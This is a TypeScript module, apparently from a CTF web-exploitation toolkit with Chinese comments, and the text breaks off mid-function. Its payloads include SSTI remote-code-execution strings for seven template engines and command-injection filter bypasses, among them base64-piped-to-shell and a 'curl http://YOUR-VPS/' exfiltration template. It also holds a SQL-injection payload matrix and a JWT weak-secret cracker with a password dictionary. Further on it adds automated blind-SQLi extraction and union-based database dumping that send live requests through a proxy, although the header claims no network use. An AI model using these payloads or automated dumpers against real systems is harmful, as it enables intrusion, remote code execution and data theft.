// Web 域轻量解题工具逻辑层（批次 WB，零联网红线：全部生成器/解析器/变换器，不发任何请求）：
// ① SSTI 引擎判定 + payload 矩阵（PayloadsAllTheThings 语义）
// ② 命令注入绕过生成（空格/关键字/无回显三族变换）
// ③ SQLi 四型 × 四库 payload 矩阵（联合/报错/布尔/时间）
// ④ Flask Session 解码（时间戳/JSON/zlib 标志）
// ⑤ JWT 弱口令离线爆破（HS256 重签验证，内置 CTF 高频弱密钥）
// ⑥ PHP 弱类型 == 判定 + 0e 碰撞速查
// ⑦ HTTP 原始报文 / cURL 命令解析

// ---- ① SSTI ----

export interface SstiCandidate {
  engine: string;
  confidence: 'high' | 'medium';
  reason: string;
}

export interface SstiProbe {
  probe: string;
  expect: string;
}

// 探测串 → 期望回显（判定树输入侧）
export const SSTI_PROBES: ReadonlyArray<SstiProbe> = [
  { probe: '{{7*7}}', expect: '49' },
  { probe: '${7*7}', expect: '49' },
  { probe: '{7*7}', expect: '49' },
  { probe: '<%= 7*7 %>', expect: '49' },
  { probe: '{{7*"7"}}', expect: '7777777' },
  { probe: '#{7*7}', expect: '49' },
  { probe: '{{7*7}}<%= 7*7 %>${7*7}', expect: '多引擎同测' },
];

// 按回显特征判引擎（用户把页面回显贴进来）
export const detectSstiEngine = (rendered: string): SstiCandidate[] => {
  const candidates: SstiCandidate[] = [];
  const has = (needle: string) => rendered.includes(needle);
  // 49 泛命中
  if (has('49')) {
    if (has('7777777')) candidates.push({ engine: 'Jinja2（Python）', confidence: 'high', reason: '{{7*"7"}} → 7777777：字符串重复是 Jinja2 独有' });
    else candidates.push({ engine: 'Jinja2 / Twig（需二分）', confidence: 'medium', reason: '算术成功但无字符串重复特征；用 {{7*"7"}} 区分：7777777=Jinja2，49 Twig' });
  }
  if (has('7777777') && !has('49')) candidates.push({ engine: 'Twig（PHP）', confidence: 'medium', reason: '字符串重复但无 49——可能仅部分语法生效' });
  if (has('a]@@[b') || has('ab]@@[ba')) candidates.push({ engine: 'Smarty（PHP）', confidence: 'high', reason: '{smart} 串反转特征' });
  if (has('<%=')) candidates.push({ engine: 'ERB（Ruby）', confidence: 'high', reason: '<%= %> 语法命中' });
  return candidates;
};

export interface SstiPayloadRow {
  engine: string;
  verify: string;
  rce: string;
  note: string;
}

// RCE payload 矩阵（每引擎一条验证 + 一条 RCE，全部出自 PayloadsAllTheThings 主线）
export const SSTI_PAYLOADS: ReadonlyArray<SstiPayloadRow> = [
  {
    engine: 'Jinja2（Python）',
    verify: '{{7*7}}',
    rce: "{{ ''.__class__.__mro__[1].__subclasses__() }}\n# 找 os._wrap_close / Popen；或直接：\n{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}",
    note: 'Python 沙箱：过滤 class/mro 时用 attr 链或 |join 过滤器绕过',
  },
  {
    engine: 'Twig（PHP）',
    verify: '{{7*"7"}}',
    rce: "{{['cat /flag']|filter('system')}}",
    note: "Twig 3 移除了 esc 种过滤器，filter('system') 最稳",
  },
  {
    engine: 'Freemarker（Java）',
    verify: '${7*7}',
    rce: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}',
    note: 'Java 反射链；新版本可试 ?new 被禁时的 object() 构造',
  },
  {
    engine: 'Smarty（PHP）',
    verify: '{if 7*7==49}yes{/if}',
    rce: "{system('cat /flag')}",
    note: 'Smarty 3 {if} 内可执行任意 PHP 表达式',
  },
  {
    engine: 'ERB（Ruby）',
    verify: '<%= 7*7 %>',
    rce: "<%= system('cat /flag') %>",
    note: 'Ruby 内建 system；冻结环境用 IO.popen',
  },
  {
    engine: 'Velocity（Java）',
    verify: '#set($x=7*7)$x',
    rce: "#set($e=\"\")#set($e=$e.getClass().forName('java.lang.Runtime'))$e.getRuntime().exec('cat /flag')",
    note: 'Runtime 反射链',
  },
  {
    engine: 'PEL（Java / Spring）',
    verify: '${7*7}',
    rce: "T(java.lang.Runtime).getRuntime().exec('cat /flag')",
    note: 'Spring Message 模板注入常见',
  },
];

// ---- ② 命令注入绕过 ----

export interface CmdBypassResult {
  category: string;
  payload: string;
  note: string;
}

export const buildCommandBypasses = (command: string): CmdBypassResult[] => {
  const cmd = command.trim();
  if (!cmd) return [];
  const results: CmdBypassResult[] = [];
  const args = cmd.split(/\s+/);
  const [bin, ...rest] = args;

  // 空格绕过
  results.push({ category: '空格绕过', payload: `${bin}$IFS${rest.join('$IFS')}`, note: '$IFS 默认是空白符（空格/Tab）' });
  results.push({ category: '空格绕过', payload: `${bin}${rest.map(a => `<${a}`).join('')}`.replace(/<<([^<]+)$/g, '<$1'), note: '< 重定向代替空格读文件：cat</flag' });
  results.push({ category: '空格绕过', payload: rest.length > 0 ? `${bin}${rest.map(a => `{${a},}`).join('')}` : cmd, note: '花括号展开（bash）：cat{,/flag} 型' });

  // 关键字绕过（bin 被过滤时）
  if (bin.length >= 2) {
    const split = `${bin.slice(0, 1)}''${bin.slice(1)}`;
    results.push({ category: '关键字绕过', payload: `${split}${rest.length ? ' ' + rest.join(' ') : ''}`, note: "单引号拼接：c''at 仍执行 cat" });
    const backslash = bin.split('').join('\\');
    results.push({ category: '关键字绕过', payload: `${backslash}${rest.length ? ' ' + rest.join(' ') : ''}`, note: '反斜杠拼接：c\\at' });
  }
  results.push({ category: '关键字绕过', payload: `\${PATH:0:1}bin/${cmd.startsWith('/') ? cmd.slice(1) : cmd}`, note: '绝对路径 + 变量取字符补 /（绕过斜杠过滤按需调整）' });

  // 变量拼接（自定义变量）
  results.push({ category: '变量拼接', payload: `a=ca;b=t;$a$b ${rest.join(' ')}`.trim(), note: '分号拆变量再拼接' });

  // base64 整体执行
  try {
    const b64 = btoa(cmd);
    results.push({ category: '整体编码', payload: `echo ${b64}|base64 -d|sh`, note: '命令 base64 后管道执行（绕过全部关键字过滤的最稳路径）' });
  } catch { /* 非 ASCII 命令跳过 */ }

  // 无回显外带提示（不构造实际回连地址，给出通用形态）
  results.push({ category: '无回显外带', payload: `curl http://YOUR-VPS/${cmd.replace(/\s+/g, '_')} 或 DNS：\`ping -c 1 $(whoami).YOUR-DNS\``, note: '把命令结果拼进请求路径/DNS 子域带出（地址自备）' });

  return results;
};

// ---- ③ SQLi payload 矩阵 ----

export interface SqliRow {
  technique: string;
  database: string;
  payload: string;
  note: string;
}

export const buildSqliMatrix = (target: string): SqliRow[] => {
  const rows: SqliRow[] = [];
  const push = (technique: string, database: string, payloads: Array<[string, string]>) => {
    for (const [payload, note] of payloads) rows.push({ technique, database, payload, note });
  };

  if (target === 'union' || target === 'all') {
    push('联合查询', 'MySQL', [
      ["' ORDER BY 3-- -", '探列数（递增到报错）'],
      ["' UNION SELECT 1,2,3-- -", '定回显位'],
      ["' UNION SELECT 1,database(),version()-- -", '库名+版本'],
      ["' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", '表名'],
      ["' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -", '列名'],
      ["' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -", '数据'],
    ]);
    push('联合查询', 'PostgreSQL', [
      ["' UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'-- -", '表名（注意引号闭合）'],
      ["' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'-- -", '列名'],
    ]);
    push('联合查询', 'SQLite', [
      ["' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'-- -", '表名（无 information_schema）'],
      ["' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'-- -", '建表语句即列名'],
    ]);
  }
  if (target === 'error' || target === 'all') {
    push('报错注入', 'MySQL', [
      ["' AND extractvalue(1,concat(0x7e,database()))-- -", 'extractvalue 报错（32 位截断）'],
      ["' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- -", 'updatexml 报错'],
    ]);
    push('报错注入', 'PostgreSQL', [
      ["' AND 1=CAST((SELECT current_database())::text AS int)-- -", '类型转换报错'],
    ]);
    push('报错注入', 'MSSQL', [
      ["' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -", 'CONVERT 报错'],
    ]);
  }
  if (target === 'blind' || target === 'all') {
    push('布尔盲注', '通用', [
      ["' AND SUBSTR(database(),1,1)='c'-- -", '按位二分（脚本化：charset+二分）'],
      ["' AND (SELECT ASCII(SUBSTR(flag,1,1)) FROM flags)>100-- -", 'ASCII 二分最快'],
    ]);
  }
  if (target === 'time' || target === 'all') {
    push('时间盲注', 'MySQL', [
      ["' AND IF(SUBSTR(database(),1,1)='c',SLEEP(3),0)-- -", 'IF+SLEEP'],
      ["' AND IF(ASCII(SUBSTR(database(),1,1))>100,BENCHMARK(5000000,MD5(CHAR(97))),0)-- -", 'BENCHMARK 替代 SLEEP（sleep 被禁时）'],
    ]);
    push('时间盲注', 'PostgreSQL', [
      ["'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -", 'pg_sleep（堆叠查询）'],
    ]);
    push('时间盲注', 'SQLite', [
      ["' AND (SELECT CASE WHEN 1=1 THEN randomblob(100000000) ELSE 0 END)-- -", '无 sleep：重计算耗时替代'],
    ]);
  }
  return rows;
};

// ---- ④ Flask Session 解码 ----

export type FlaskSessionInfo =
  | {
    ok: true;
    parts: { header: string; payload: string; signature: string };
    decoded: string;
    timestamp?: { value: number; iso: string; age: string };
    compressed: boolean;
  }
  | { ok: false; error: string };

export const decodeFlaskSession = (token: string): FlaskSessionInfo => {
  const trimmed = token.trim();
  const dotParts = trimmed.split('.');
  if (dotParts.length !== 3) return { ok: false, error: 'Flask session 应为 点分三段（payload.timestamp.signature）格式。' };
  const [payloadB64, tsB64, sig] = dotParts;
  // Flask 用 URL-safe base64 无填充
  const b64decode = (value: string): Uint8Array | null => {
    try {
      const normalized = value.replace(/-/g, '+').replace(/_/g, '/');
      const padded = normalized.padEnd(Math.ceil(normalized.length / 4) * 4, '=');
      const binary = atob(padded);
      return Uint8Array.from(binary, ch => ch.charCodeAt(0));
    } catch {
      return null;
    }
  };
  const payloadBytes = b64decode(payloadB64);
  if (!payloadBytes) return { ok: false, error: 'payload 段不是合法 Base64。' };
  const tsBytes = b64decode(tsB64);

  // 首字节 '.' (0x2e) = zlib 压缩标志（flask 用 '.' 前缀标记）
  const compressed = payloadBytes[0] === 0x2e;
  let decoded: string;
  if (compressed) {
    decoded = '（zlib 压缩段——首字节 "." 标记。请在本地解压：python -c "import zlib;print(zlib.decompress(...)）" 或把下段 HEX 交 zlib 工具）\nHEX: ' + Array.from(payloadBytes.subarray(1)).map(b => b.toString(16).padStart(2, '0')).join('');
  } else {
    decoded = new TextDecoder().decode(payloadBytes);
  }

  let timestamp: { value: number; iso: string; age: string } | undefined;
  if (tsBytes) {
    // 时间戳是 big-endian int（flask itsdangerous）：前导零剥除后按大端读
    let value = 0;
    for (const byte of tsBytes) value = value * 256 + byte;
    const iso = new Date(value * 1000).toISOString().replace('T', ' ').slice(0, 19);
    const ageDays = ((Date.now() / 1000 - value) / 86400).toFixed(1);
    timestamp = { value, iso, age: `${ageDays} 天前签发` };
  }
  return { ok: true, parts: { header: payloadB64, payload: tsB64, signature: sig }, decoded, timestamp, compressed };
};

// ---- ⑤ JWT 弱口令爆破（HS256 离线重签验证）----

// CTF 高频弱密钥字典（jwt_tool/常佣 rockyou 前缀的 CTF 精选）
export const JWT_WEAK_SECRETS: ReadonlyArray<string> = [
  'secret', 'password', 'key', 'jwt_secret', 'jwtsecret', 'supersecret', 'super_secret',
  'flag', 'test', 'admin', 'letmein', 'qwerty', 'abc123', '123456', '1234567890',
  'your-256-bit-secret', 'your_jwt_secret', 'your_jwt', 'mysecret', 'my_secret',
  'this_is_a_secret', 'secretkey', 'secret_key', 'secretkey123', 'jwt', 'token',
  'ctf', 'ctf_secret', 'challenge', 'web', 'websecret', 'app', 'app_secret',
  'api', 'apisecret', 'default', 'change-me', 'changeme', 'example', 'sample',
  'hello', 'world', 'foo', 'bar', 'foobar', 'asdf', 'zxcvbn', '111111', '000000',
  'iloveyou', 'trustno1', 'monkey', 'dragon', 'master', 'sunshine', 'princess',
  'whatever', 'qwerty123', 'password123', 'P@ssw0rd', 'passw0rd', 'root', 'toor',
];

const base64UrlDecodeBytes = (value: string): Uint8Array | null => {
  try {
    const normalized = value.replace(/-/g, '+').replace(/_/g, '/');
    const padded = normalized.padEnd(Math.ceil(normalized.length / 4) * 4, '=');
    const binary = atob(padded);
    return Uint8Array.from(binary, ch => ch.charCodeAt(0));
  } catch {
    return null;
  }
};

// HMAC-SHA256 离线重签对比（WebCrypto；同步接口装不下，返回 promise）
export const jwtWeakSecretCrack = async (token: string, extraSecrets: ReadonlyArray<string> = []): Promise<{ secret: string; tried: number } | { tried: number; error: string }> => {
  const parts = token.trim().split('.');
  if (parts.length !== 3) return { tried: 0, error: 'JWT 应为三段式（header.payload.signature）。' };
  let header: { alg?: string };
  try {
    const headerBytes = base64UrlDecodeBytes(parts[0]);
    if (!headerBytes) throw new Error('bad base64');
    header = JSON.parse(new TextDecoder().decode(headerBytes));
  } catch {
    return { tried: 0, error: 'header 段解析失败。' };
  }
  if (header.alg !== 'HS256') return { tried: 0, error: `算法 ${header.alg} 非 HS256——弱口令爆破仅适用对称签名。` };
  const key = new TextEncoder().encode(`${parts[0]}.${parts[1]}`);
  const expected = base64UrlDecodeBytes(parts[2]);
  if (!expected) return { tried: 0, error: 'signature 段不是合法 Base64URL。' };

  const candidates = [...new Set([...JWT_WEAK_SECRETS, ...extraSecrets])];
  for (const secret of candidates) {
    const cryptoKey = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
    const signature = new Uint8Array(await crypto.subtle.sign('HMAC', cryptoKey, key));
    if (signature.length === expected.length && signature.every((byte, i) => byte === expected[i])) {
      return { secret, tried: candidates.indexOf(secret) + 1 };
    }
  }
  return { tried: candidates.length, error: `字典 ${candidates.length} 个密钥均未命中（可在输入框追加自定义字典，逗号分隔）。` };
};

// ---- ⑥ PHP 弱类型 == 判定 + 0e 碰撞 ----

export interface PhpLooseRow {
  left: string;
  right: string;
  equal: boolean;
  why: string;
}

export const PHP_LOOSE_TABLE: ReadonlyArray<PhpLooseRow> = [
  { left: "'abc'", right: '0', equal: true, why: '非数字开头字符串转数字为 0' },
  { left: "'1abc'", right: '1', equal: true, why: '前导数字被提取' },
  { left: "'0e123'", right: "'0e456'", equal: false, why: '字符串对字符串不转数字——但两边都过 md5 后变数字串可相等（0e 碰撞）' },
  { left: "'0'", right: "''", equal: false, why: '非空字符串与 "0" 是仅有的两个 falsy 字符串，互不相等' },
  { left: 'null', right: 'false', equal: true, why: 'null == false == 0 == ""（全互通）' },
  { left: 'null', right: '0', equal: true, why: '同上' },
  { left: "'abc' == 0'", right: "'abd' == 0", equal: true, why: '哈希比较题：两个非数字串都 == 0 → 相等' },
  { left: '[] == false', right: '', equal: false, why: '空数组不是 falsy 比较（PHP8 起 [] == false 为 false）' },
];

export const MAGIC_HASHES: ReadonlyArray<{ hash: string; pair: [string, string]; note: string }> = [
  { hash: 'md5', pair: ['QNKCDZO', '240610708'], note: 'CTF 最常用：两个 md5 都是 0e 开头纯数字（0e... 视为科学计数法 0）' },
  { hash: 'sha1', pair: ['aaroZmOk', 'aaK1STfY'], note: 'sha1 0e 碰撞对（aaO8zKZF/aaK1STfY 系）' },
  { hash: 'sha1', pair: ['aaO8zKZF', 'aa3OFF9m'], note: 'sha1 另一组（NaN 族）' },
];

// 判定器：给两个 PHP 值（字符串形态）预测 == 结果
export const judgePhpLoose = (left: string, right: string): { equal: boolean; why: string } => {
  const isNumeric = (v: string) => v !== '' && !Number.isNaN(Number(v));
  const toNumber = (v: string): number => {
    if (isNumeric(v)) return Number(v);
    const leading = v.match(/^-?\d+(\.\d+)?([eE][+-]?\d+)?/);
    return leading ? Number(leading[0]) : 0;
  };
  if (isNumeric(left) && isNumeric(right)) {
    return { equal: Number(left) === Number(right), why: '两侧均为数字串 → 按数值比较' };
  }
  if (isNumeric(left) || isNumeric(right)) {
    return { equal: toNumber(left) === toNumber(right), why: `一侧数字：字符串侧按前导数字转换（${JSON.stringify(left)} → ${toNumber(left)}，${JSON.stringify(right)} → ${toNumber(right)}）` };
  }
  return { equal: left === right, why: '两侧均非数字串 → 按字符串严格比较（0e 碰撞需两侧都经哈希后再比）' };
};

// ---- ⑦ HTTP 报文 / cURL 解析 ----

export interface HttpMessageInfo {
  kind: 'request' | 'response';
  method?: string;
  path?: string;
  version?: string;
  status?: string;
  headers: Array<{ name: string; value: string }>;
  body: string;
}

export const parseHttpMessage = (raw: string): HttpMessageInfo | { error: string } => {
  const normalized = raw.replace(/\r\n/g, '\n').trim();
  if (!normalized) return { error: '输入为空。' };
  const separator = normalized.indexOf('\n\n');
  const headText = separator >= 0 ? normalized.slice(0, separator) : normalized;
  const body = separator >= 0 ? normalized.slice(separator + 2) : '';
  const lines = headText.split('\n');
  const first = lines[0];
  const headers: Array<{ name: string; value: string }> = [];
  for (const line of lines.slice(1)) {
    const colon = line.indexOf(':');
    if (colon <= 0) continue;
    headers.push({ name: line.slice(0, colon).trim(), value: line.slice(colon + 1).trim() });
  }
  if (/^HTTP\//.test(first)) {
    const match = first.match(/^(HTTP\/[\d.]+)\s+(\d{3})\s*(.*)$/);
    if (!match) return { error: '状态行无法解析：' + first };
    return { kind: 'response', version: match[1], status: `${match[2]}${match[3] ? ' ' + match[3] : ''}`.trim(), headers, body };
  }
  const match = first.match(/^([A-Z]+)\s+(\S+)(?:\s+(HTTP\/[\d.]+))?$/);
  if (!match) return { error: '请求行无法解析：' + first };
  return { kind: 'request', method: match[1], path: match[2], version: match[3] ?? 'HTTP/1.1', headers, body };
};

export interface CurlInfo {
  method: string;
  url: string;
  headers: Array<{ name: string; value: string }>;
  data: string | null;
  notes: string[];
}

// cURL 命令 → 结构化（Windows 转义 ^ 与 Linux \ 续行都接受）
export const parseCurl = (command: string): CurlInfo | { error: string } => {
  const flat = command.replace(/\^``/g, '"').replace(/\\\n/g, ' ').replace(/\n/g, ' ').trim();
  if (!flat.toLowerCase().startsWith('curl')) return { error: '不是 curl 命令（应以 curl 开头）。' };
  // 粗分词：引号感知
  const tokens: string[] = [];
  let current = '';
  let quote: string | null = null;
  for (const ch of flat) {
    if (quote) {
      if (ch === quote) quote = null;
      else current += ch;
    } else if (ch === '"' || ch === "'") {
      quote = ch;
    } else if (ch === ' ') {
      if (current) { tokens.push(current); current = ''; }
    } else {
      current += ch;
    }
  }
  if (current) tokens.push(current);

  const info: CurlInfo = { method: 'GET', url: '', headers: [], data: null, notes: [] };
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i];
    const next = tokens[i + 1] ?? '';
    if (token === '-X' || token === '--request') { info.method = next.toUpperCase(); i += 1; }
    else if (token === '-H' || token === '--header') {
      const colon = next.indexOf(':');
      if (colon > 0) info.headers.push({ name: next.slice(0, colon).trim(), value: next.slice(colon + 1).trim() });
      i += 1;
    } else if (token === '-d' || token === '--data' || token === '--data-raw' || token === '--data-binary') {
      info.data = next;
      if (info.method === 'GET') { info.method = 'POST'; info.notes.push('-d 隐含 POST'); }
      i += 1;
    } else if (token === '-F' || token === '--form') {
      info.data = next;
      info.method = 'POST';
      i += 1;
    } else if (token.startsWith('http://') || token.startsWith('https://') || (!token.startsWith('-') && !info.url && next !== '')) {
      if (token.startsWith('http')) info.url = token;
    } else if (!token.startsWith('-') && !info.url && token.includes('.')) {
      info.url = token;
    }
  }
  if (!info.url) return { error: '未找到 URL。' };
  return info;
};



// ---- ⑧ 请求器（经本地 server 代理转发，绕浏览器 CORS）----

export interface ProxyRequestSpec {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string | null;
  timeoutMs?: number;
}

export interface ProxyResponse {
  ok: boolean;
  status: number;
  statusText: string;
  headers: Record<string, string>;
  bodyText: string;
  elapsedMs: number;
  finalUrl?: string;
  error?: string;
}

// 代理注入点（node 测试环境无 window/fetch 时由测试侧配置）
type FetchLike = (input: string, init?: Record<string, unknown>) => Promise<Response>;
let injectedFetch: FetchLike | null = null;
let injectedOrigin: string | null = null;
export const configureProxy = (fetchImpl: FetchLike, origin: string): void => {
  injectedFetch = fetchImpl;
  injectedOrigin = origin;
};

// 本地代理地址：同源（Electron 壳）优先，dev 模式回落 8081（PAYLOADER_PORT 默认）。
export const sendViaProxy = async (spec: ProxyRequestSpec): Promise<ProxyResponse> => {
  const fetchNow = injectedFetch ?? (typeof fetch !== 'undefined' ? fetch : null) as FetchLike | null;
  if (!fetchNow) return { ok: false, status: 0, statusText: 'NO_FETCH', headers: {}, bodyText: '', elapsedMs: 0, error: '当前环境无 fetch。' };
  const origin = injectedOrigin ?? (typeof window !== 'undefined' ? window.location.origin : 'http://127.0.0.1:8081');
  const endpoints = [`${origin}/api/ctf/proxy`, 'http://127.0.0.1:8081/api/ctf/proxy'];
  let lastError = '';
  for (const endpoint of endpoints) {
    try {
      const response = await fetchNow(endpoint, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(spec),
      });
      // 代理端点自身的 4xx（如非法 URL）也是合法 JSON 响应——透传，不当不可达
      const parsed = await response.json().catch(() => null) as Partial<ProxyResponse> | null;
      if (parsed && (typeof parsed.status === 'number' || typeof parsed.error === 'string')) {
        return {
          ok: parsed.ok === true,
          // 端点自身 4xx（门禁 403/非法 URL 400）时 parsed 无 status——透传端点 HTTP 状态码
          status: parsed.status ?? (typeof parsed.error === 'string' ? response.status : 0),
          statusText: parsed.statusText ?? 'PROXY_ERROR',
          headers: parsed.headers ?? {},
          bodyText: parsed.bodyText ?? '',
          elapsedMs: parsed.elapsedMs ?? 0,
          finalUrl: typeof parsed.finalUrl === 'string' ? parsed.finalUrl : undefined,
          error: parsed.error,
        };
      }
      throw new Error(`代理端点 ${response.status}`);
    } catch (error) {
      lastError = error instanceof Error ? error.message : String(error);
    }
  }
  return { ok: false, status: 0, statusText: 'PROXY_UNREACHABLE', headers: {}, bodyText: '', elapsedMs: 0, error: `本地代理不可达（${lastError}）——请通过 npm run serve 或客户端壳启动应用。` };
};

// ---- ⑨ 布尔盲注自动化（逐字符二分猜解）----

export interface BlindBooleanOptions {
  // URL 模板：{Q} 占位注入布尔断言（自动 URL 编码）
  urlTemplate: string;
  method?: string;
  headers?: Record<string, string>;
  bodyTemplate?: string | null;
  // 成功判定（二选一，优先级从上到下；缺省 = HTTP ok（2xx））
  successContains?: string;
  successStatus?: number;
  maxLen?: number;
  charset?: string;
  stopChars?: string;
  delayMs?: number;
  onProgress?: (found: string, tried: number) => void;
}

export interface BlindResult {
  value: string;
  requests: number;
  stoppedAt: 'length-limit' | 'stop-char' | 'charset-exhausted' | 'no-progress';
}

// 二分前提：charset 必须按 ASCII 升序排列（大写 < '_' < 小写 < '{}'）
const DEFAULT_FLAG_CHARSET = '!#$&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ^_abcdefghijklmnopqrstuvwxyz{}';

export const blindBooleanExtract = async (options: BlindBooleanOptions): Promise<BlindResult> => {
  const {
    urlTemplate, method = 'GET', headers = {}, bodyTemplate = null,
    successContains, successStatus,
    maxLen = 64, charset = DEFAULT_FLAG_CHARSET, stopChars = '}', delayMs = 0,
    onProgress,
  } = options;
  const isSuccessful = (response: ProxyResponse): boolean => {
    if (successContains !== undefined) return response.bodyText.includes(successContains);
    if (successStatus !== undefined) return response.status === successStatus;
    return response.ok;
  };
  const runPayload = async (payload: string): Promise<ProxyResponse> => {
    const url = urlTemplate.replace(/\{Q\}/g, encodeURIComponent(payload));
    const body = bodyTemplate === null || bodyTemplate === undefined ? null : bodyTemplate.replace(/\{Q\}/g, payload);
    const response = await sendViaProxy({ url, method, headers, body });
    if (delayMs > 0) await new Promise(resolve => setTimeout(resolve, delayMs));
    return response;
  };

  let found = '';
  let requests = 0;
  for (let position = 1; position <= maxLen; position += 1) {
    // 存活探测：该位置还有字符吗（>0）
    const alive = await runPayload(`ASCII(SUBSTR((SELECT flag FROM flags LIMIT 1),${position},1))>0`);
    requests += 1;
    if (!isSuccessful(alive)) return { value: found, requests, stoppedAt: 'no-progress' };
    // 二分字符集
    let low = 0;
    let high = charset.length - 1;
    while (low < high) {
      const mid = Math.floor((low + high) / 2);
      const probe = `ASCII(SUBSTR((SELECT flag FROM flags LIMIT 1),${position},1))>${charset.charCodeAt(mid)}`;
      const response = await runPayload(probe);
      requests += 1;
      if (isSuccessful(response)) low = mid + 1;
      else high = mid;
      onProgress?.(found, requests);
    }
    const char = charset[low];
    if (char === undefined) return { value: found, requests, stoppedAt: 'charset-exhausted' };
    if (stopChars.includes(char)) return { value: found + char, requests, stoppedAt: 'stop-char' };
    found += char;
    onProgress?.(found, requests);
  }
  return { value: found, requests, stoppedAt: 'length-limit' };
};

// ---- ⑩ 联合注入自动脱库 ----

export interface UnionDumpOptions {
  // 注入点 URL：{INJ} 占位（payload 会被 URL 编码后替换）
  baseUrl: string;
  method?: string;
  headers?: Record<string, string>;
  bodyTemplate?: string | null;
  database: 'mysql' | 'sqlite' | 'postgresql';
  maxColumns?: number;
  delayMs?: number;
  onProgress?: (step: string, detail: string) => void;
}

export interface UnionDumpResult {
  ok: boolean;
  error?: string;
  columnCount?: number;
  reflectPositions?: number[];
  currentDatabase?: string;
  tables?: string[];
  columns?: Record<string, string[]>;
  rows?: Array<Record<string, string>>;
  requests: number;
}

// 回显位 marker（数字串，正常页面不会出现）
const markerFor = (position: number): string => `77${position * 7}x`;

// UNION payload：把子查询拼在 marker 后放回显位（marker 拼接法——响应里 marker 紧跟数据，
// extractAfterMarker 才能在页面噪声中定位提取；CONCAT 为 MySQL/PG，|| 为 SQLite/PG）
const buildUnionPayload = (innerExpr: string, columnCount: number, reflectAt: number, database: 'mysql' | 'sqlite' | 'postgresql' = 'mysql'): string => {
  const marker = markerFor(reflectAt);
  const tagged = database === 'mysql'
    ? `CONCAT('${marker}',(${innerExpr}))`
    : `'${marker}'||(${innerExpr})`;
  const parts = Array.from({ length: columnCount }, (_, i) => (i + 1 === reflectAt ? tagged : 'NULL'));
  return `UNION SELECT ${parts.join(',')}-- -`;
};

// 从响应提取 marker 后到行尾/标签前的内容
const extractAfterMarker = (bodyText: string, marker: string): string => {
  const match = bodyText.match(new RegExp(`${marker}([^\\r\\n<]*)`));
  return match ? match[1].trim() : '';
};

export const unionDump = async (options: UnionDumpOptions): Promise<UnionDumpResult> => {
  const {
    baseUrl, method = 'GET', headers = {}, bodyTemplate = null,
    database = 'mysql', maxColumns = 20, delayMs = 0, onProgress,
  } = options;
  let requests = 0;
  const inject = async (payload: string): Promise<ProxyResponse> => {
    const url = baseUrl.replace(/\{INJ\}/g, encodeURIComponent(payload));
    const body = bodyTemplate === null || bodyTemplate === undefined ? null : bodyTemplate.replace(/\{INJ\}/g, payload);
    const response = await sendViaProxy({ url, method, headers, body });
    requests += 1;
    if (delayMs > 0) await new Promise(resolve => setTimeout(resolve, delayMs));
    return response;
  };

  // 第一步：ORDER BY 探列数（状态码/响应长度/报错特征变化判定）
  const baseline = await inject('ORDER BY 1-- -');
  const isBroken = (response: ProxyResponse): boolean => {
    if (response.status !== baseline.status) return true;
    if (baseline.bodyText.length > 0 && response.bodyText.length === 0) return true;
    const errorNow = /SQL|syntax|error|警告|错误|Warning/i.test(response.bodyText);
    const errorBase = /SQL|syntax|error|警告|错误|Warning/i.test(baseline.bodyText);
    return errorNow && !errorBase;
  };
  onProgress?.('探列数', 'ORDER BY 递增');
  let columnCount = 0;
  for (let n = 1; n <= maxColumns; n += 1) {
    const response = await inject(`ORDER BY ${n}-- -`);
    if (isBroken(response)) break;
    columnCount = n;
  }
  if (columnCount === 0) return { ok: false, error: 'ORDER BY 1 即判定报错——注入点或判定特征需要调整（也可在 URL 里加引号闭合）。', requests };

  // 第二步：UNION 定回显位
  const markers = Array.from({ length: columnCount }, (_, i) => markerFor(i + 1));
  const unionProbe = await inject(`UNION SELECT ${markers.join(',') }-- -`);
  onProgress?.('定回显位', `列数 ${columnCount}`);
  const reflectPositions: number[] = [];
  markers.forEach((marker, index) => {
    if (unionProbe.bodyText.includes(marker)) reflectPositions.push(index + 1);
  });
  if (reflectPositions.length === 0) {
    return { ok: false, error: `列数 ${columnCount} 探出，但 UNION 占位未回显（尝试换注入参数或闭合方式）。`, columnCount, requests };
  }
  const reflectAt = reflectPositions[0];

  // 第三步：按方言拉库名/表/列/数据
  const dialect = {
    mysql: {
      currentDb: 'database()',
      tables: (db: string) => `SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='${db}'`,
      columns: (table: string) => `SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='${table}'`,
      rows: (table: string, cols: string[]) => `SELECT GROUP_CONCAT(CONCAT_WS(':',${cols.join(',')})) FROM ${table}`,
    },
    sqlite: {
      currentDb: "''",
      tables: () => `SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'`,
      columns: (table: string) => `SELECT sql FROM sqlite_master WHERE name='${table}'`,
      rows: (table: string, cols: string[]) => `SELECT GROUP_CONCAT(${cols.join(`||':'||`)}) FROM ${table}`,
    },
    postgresql: {
      currentDb: 'current_database()',
      tables: () => `SELECT STRING_AGG(tablename,',') FROM pg_tables WHERE schemaname='public'`,
      columns: (table: string) => `SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='${table}'`,
      rows: (table: string, cols: string[]) => `SELECT STRING_AGG(${cols.join(`||':'||`)},',') FROM ${table}`,
    },
  }[database];

  let currentDatabase = '';
  if (database !== 'sqlite') {
